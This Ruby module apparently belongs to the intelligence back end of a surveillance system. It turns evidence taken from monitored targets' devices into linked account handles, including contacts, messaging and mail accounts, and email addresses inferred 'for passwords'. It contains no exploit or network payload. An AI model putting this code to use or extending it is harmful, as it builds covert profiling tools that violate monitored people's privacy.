#
#  Module for retrieving the accounts of the targets
#

require 'mail'

# from RCS::Common
require 'rcs-common/trace'

module RCS
module Intelligence

class Accounts
  include Tracer
  extend Tracer

  class << self

    def addressbook_types
      [:facebook, :twitter, :gmail, :skype, :bbm, :whatsapp, :phone, :mail, :linkedin, :viber]
    end

    def add_handle(entity, evidence)
      data = evidence[:data]

      trace :debug, "Parsing handle data: #{data.inspect}"

      # target account in the contacts (addressbook)
      if addressbook_types.include? data['program']
        return if data['type'] != :target

        if data['handle']
          create_entity_handle(entity, :automatic, data['program'], data['handle'].downcase, data['name'])
        end
      elsif (data['program'] =~ /outlook|mail/i || data['user'])
        # mail accounts from email clients saving account to the device
        # OR infer on the user to discover email addresses (for passwords)
        create_entity_handle_from_user entity, data['user'], data['service']
      end
    rescue Exception => e
      trace :error, "Cannot add handle: " + e.message
      trace :fatal, e.backtrace.join("\n")
    end

    def create_entity_handle_from_user entity, user, service
      handle = user.downcase
      add_domain handle, service
      type = get_type handle, service
      return if !is_mail? handle
      create_entity_handle entity, :automatic, type, handle, ''
    end

    def create_entity_handle(entity, level, type, handle, name)
      existing_handle = entity.handles.where(type: type, handle: handle).first

      if existing_handle
        if existing_handle.empty_name?
          trace :info, "Modifying handle [#{type}, #{handle}, #{name}] on entity: #{entity.name}"
          existing_handle.update_attributes name: name
        end

        existing_handle
      else
        trace :info, "Adding handle [#{type}, #{handle}, #{name}] to entity: #{entity.name}"
        # add to the list of handles
        entity.handles.create! level: level, type: type, name: name, handle: handle
      end
    end

    def is_mail?(value)
      return false if value == ''
      parsed = Mail::Address.new(value)
      return parsed.address == value && parsed.local != parsed.address
    rescue Mail::Field::ParseError
      return false
    end

    def add_domain(user, service)
      user << '@gmail.com' if service =~ /gmail|google/i and not is_mail?(user)
      user << '@hotmail.com' if service =~ /hotmail/i and not is_mail?(user)
      user << '@facebook.com' if service =~ /facebook/i and not is_mail?(user)
    end

    def get_type(user, service)

      #if already in email form, check the domain, else check the service
      to_search = is_mail?(user) ? user : service

      case to_search
        when /gmail/i
          return :gmail
        when /facebook/i
          return :facebook
      end

      return :mail
    end

    def get_addressbook_handle(evidence)
      data = evidence[:data]

      if addressbook_types.include? data['program']
        # don't return data from the target
        return nil if data['type'].eql? :target
        return [data['name'], data['program'], data['handle'].downcase] if data['handle']
      end
      return nil
    end

  end

end

end
end

